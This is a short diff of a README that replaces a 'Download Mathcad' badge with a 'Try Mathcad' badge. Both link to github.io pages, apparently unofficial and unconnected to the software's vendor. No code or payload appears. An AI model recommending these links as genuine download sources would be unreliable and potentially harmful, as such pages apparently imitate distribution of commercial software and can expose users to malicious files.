@@ -2,7 +2,7 @@
 
 ## 📥 Mathcad
 
-[![⬇️ Mathcad](https://img.shields.io/badge/Download-Mathcad-blue?style=for-the-badge&logo=windows)](https://sofiakuehuh216.github.io/.github/mathcad-engineering-calculation)
+[![Try Mathcad](https://img.shields.io/badge/Try-Mathcad-137C5B?style=for-the-badge)](https://mathcad-engineering.github.io/.github/)
 
 ---
 
